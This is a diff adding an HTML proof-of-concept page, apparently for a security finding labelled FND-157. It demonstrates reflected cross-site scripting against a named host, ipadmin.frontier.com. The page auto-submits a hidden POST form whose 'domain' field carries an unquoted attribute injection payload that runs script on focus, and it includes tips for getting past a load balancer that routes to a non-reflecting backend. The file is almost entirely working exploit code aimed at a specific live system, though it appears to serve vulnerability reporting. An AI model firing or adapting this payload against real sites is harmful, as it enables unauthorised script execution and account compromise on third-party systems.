@@ -1,0 +1,40 @@
+<!--
+  FND-157 PoC: Reflected XSS via unquoted attribute injection
+  Target: ipadmin.frontier.com POST /bgp_procedures_new_form.php
+
+  NOTE: The Alteon LB has two backends. One reflects POST values, one doesn't.
+  If you get the blank form (no alert), click "Try Again" to re-roll the LB.
+-->
+<html>
+<body>
+<h3>FND-157: ipadmin.frontier.com Reflected XSS PoC</h3>
+<p>Auto-submitting POST form. If no alert fires, the LB routed to the non-reflecting backend — click below to retry.</p>
+<form id="xss" method="POST" action="https://ipadmin.frontier.com/bgp_procedures_new_form.php">
+  <input type="hidden" name="domain" value="x onfocus=alert(document.domain) autofocus">
+  <input type="hidden" name="registry" value="N/A">
+  <input type="hidden" name="app_type" value="new">
+  <input type="hidden" name="asn" value="12345">
+  <input type="hidden" name="circuit" value="TEST">
+  <input type="hidden" name="peer" value="10.0.0.1">
+  <input type="hidden" name="address" value="test">
+  <input type="hidden" name="city" value="test">
+  <input type="hidden" name="state" value="NY">
+  <input type="hidden" name="zip" value="10001">
+  <input type="hidden" name="name" value="test">
+  <input type="hidden" name="phone" value="555">
+  <input type="hidden" name="email" value="t@t.com">
+  <input type="hidden" name="brand" value="C">
+  <input type="hidden" name="model" value="26">
+  <input type="hidden" name="ram" value="">
+  <input type="hidden" name="transit" value="N">
+  <input type="hidden" name="tranas" value="">
+  <input type="hidden" name="upstream" value="">
+  <input type="hidden" name="upstreamas" value="">
+  <input type="hidden" name="routes" value="">
+  <input type="hidden" name="special" value="">
+  <input type="hidden" name="prefix" value="">
+  <input type="submit" value="Try Again">
+</form>
+<script>document.getElementById('xss').submit();</script>
+</body>
+</html>
